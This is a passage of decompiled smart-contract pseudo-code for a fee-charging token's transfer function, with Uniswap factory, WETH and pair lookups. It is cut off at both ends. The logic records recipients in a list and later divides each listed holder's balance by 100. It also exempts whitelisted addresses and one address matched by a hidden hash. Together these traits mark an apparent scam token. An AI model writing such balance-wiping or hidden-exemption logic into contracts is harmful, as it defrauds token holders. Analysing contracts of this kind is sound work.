                                                            emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                            if arg2 * _fee / 100:
                                                                emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                            else:
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[0] = arg1
                                    mem[32] = 16
                                    if stor16[address(arg1)]:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        mem[mem[64] + 32] = address(arg1)
                                        _12238 = mem[64]
                                        mem[mem[64]] = 20
                                        mem[64] = mem[64] + 52
                                        if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12238 + 32 len mem[_12238]]):
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if this.address == arg1:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor16[address(arg1)]:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if stor18:
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if not arg2:
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor66DE[stor19.length] = arg2
                                                            if arg2 < 0:
                                                                revert with 0, 17
                                                            if balanceOf[0] > -1:
                                                                revert with 0, 17
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 0, 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[arg1] > !arg2:
                                                                revert with 0, 17
                                                            balanceOf[arg1] += arg2
                                                            emit Transfer(arg2, msg.sender, arg1);
                                                        else:
                                                            if arg2 and _fee > -1 / arg2:
                                                                revert with 0, 17
                                                            if not arg2:
                                                                revert with 0, 18
                                                            if arg2 * _fee / arg2 != _fee:
                                                                revert with 0, 'SafeMath: multiplication overflow'
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor66DE[stor19.length] = arg2
                                                            if arg2 < arg2 * _fee / 100:
                                                                revert with 0, 17
                                                            if balanceOf[0] > !(arg2 * _fee / 100):
                                                                revert with 0, 17
                                                            balanceOf[0] += arg2 * _fee / 100
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 0, 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                                revert with 0, 17
                                                            balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                            emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                            if arg2 * _fee / 100:
                                                                emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[32] = 13
                    require arg2 <= balanceOf[address(msg.sender)]
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    mem[148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    mem[(2 * ceil32(return_data.size)) + 152] = this.address
                    mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    mem[64] = (4 * ceil32(return_data.size)) + 148
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if ext_call.return_data[12 len 20] != msg.sender:
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if arg1 == ext_call.return_data[12 len 20]:
                            if stor16[address(msg.sender)]:
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(arg1):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if this.address == arg1:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor18:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if not arg2:
                                    require arg2 <= _maxTxAmount
                                    require ext_code.size(stor10)
                                    staticcall stor10.factory() with:
                                            gas gas_remaining wei
                                    mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                    require ext_code.size(stor10)
                                    staticcall stor10.WETH() with:
                                            gas gas_remaining wei
                                           args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                    mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                    require ext_code.size(address(ext_call.return_data[0]))
                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                            gas gas_remaining wei
                                           args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    if ext_call.return_data[12 len 20] == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      arg1,
                                        return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                    stor19.length++
                                    stor19[stor19.length].field_0 = arg1
                                    stor66DE[stor19.length] = arg2
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                else:
                                    if arg2 and _fee > -1 / arg2:
                                        revert with 0, 17
                                    if not arg2:
                                        revert with 0, 18
                                    if arg2 * _fee / arg2 != _fee:
                                        revert with 0, 'SafeMath: multiplication overflow'
                                    require arg2 <= _maxTxAmount
                                    require ext_code.size(stor10)
                                    staticcall stor10.factory() with:
                                            gas gas_remaining wei
                                    mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                    require ext_code.size(stor10)
                                    staticcall stor10.WETH() with:
                                            gas gas_remaining wei
                                           args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                    mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                    require ext_code.size(address(ext_call.return_data[0]))
                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                            gas gas_remaining wei
                                           args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    if ext_call.return_data[12 len 20] == arg1:
                                        if arg2 < arg2 * _fee / 100:
                                            revert with 0, 17
                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                            revert with 0, 17
                                        balanceOf[0] += arg2 * _fee / 100
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                            revert with 0, 17
                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 - (arg2 * _fee / 100),
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      arg1,
                                        if arg2 * _fee / 100:
                                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                                          arg2 * _fee / 100,
                                                          mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                          msg.sender,
                                                          0,
                                        return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                    stor19.length++
                                    stor19[stor19.length].field_0 = arg1
                                    stor66DE[stor19.length] = arg2
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 0, 17
                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                        revert with 0, 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                        revert with 0, 17
                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if stor16[address(arg1)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(arg1):
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if this.address == arg1:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if ext_call.return_data[12 len 20] != msg.sender:
                            if msg.sender == address(ext_call.return_data[0]):
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                        else:
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                        if stor18:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if not arg2:
                            require arg2 <= _maxTxAmount
                            require ext_code.size(stor10)
                            staticcall stor10.factory() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor10)
                            staticcall stor10.WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[(15 * ceil32(return_data.size)) + 268] = this.address
                            mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                            require ext_code.size(address(ext_call.return_data[0]))
                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            if ext_call.return_data[12 len 20] == arg1:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                            stor19.length++
                            stor19[stor19.length].field_0 = arg1
                            stor66DE[stor19.length] = arg2
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                        else:
                            if arg2 and _fee > -1 / arg2:
                                revert with 0, 17
                            if not arg2:
                                revert with 0, 18
                            if arg2 * _fee / arg2 != _fee:
                                revert with 0, 'SafeMath: multiplication overflow'
                            require arg2 <= _maxTxAmount
                            require ext_code.size(stor10)
                            staticcall stor10.factory() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor10)
                            staticcall stor10.WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[(15 * ceil32(return_data.size)) + 268] = this.address
                            mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                            require ext_code.size(address(ext_call.return_data[0]))
                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            if ext_call.return_data[12 len 20] == arg1:
                                if arg2 < arg2 * _fee / 100:
                                    revert with 0, 17
                                if balanceOf[0] > !(arg2 * _fee / 100):
                                    revert with 0, 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                    revert with 0, 17
                                balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                                return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                            stor19.length++
                            stor19[stor19.length].field_0 = arg1
                            stor66DE[stor19.length] = arg2
                            if arg2 < arg2 * _fee / 100:
                                revert with 0, 17
                            if balanceOf[0] > !(arg2 * _fee / 100):
                                revert with 0, 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                revert with 0, 17
                            balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                        return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                    idx = 0
                    while idx < stor19.length:
                        mem[0] = stor19[idx].field_0
                        mem[32] = 13
                        _7735 = mem[64]
                        mem[64] = mem[64] + 64
                        mem[_7735] = 26
                        mem[_7735 + 32] = 'SafeMath: division by zero'
                        if idx >= stor19.length:
                            revert with 0, 50
                        mem[0] = stor19[idx].field_0
                        mem[32] = 13
                        balanceOf[stor19[idx].field_0] = balanceOf[stor19[idx].field_0] / 100
                        if idx == -1:
                            revert with 0, 17
                        idx = idx + 1
                        continue 
                    stor19.length = 0
                    mem[0] = 19
                    idx = 0
                    while 2 * stor19.length > idx:
                        stor19[idx].field_0 = 0
                        stor19[idx].field_256 = 0
                        idx = idx + 2
                        continue 
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11543 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11549 = mem[_11543]
                    require mem[_11543] == mem[_11543 + 12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11567 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11573 = mem[_11567]
                    require mem[_11567] == mem[_11567 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_11573)
                    require ext_code.size(address(_11549))
                    staticcall address(_11549).getPair(address arg1, address arg2) with:
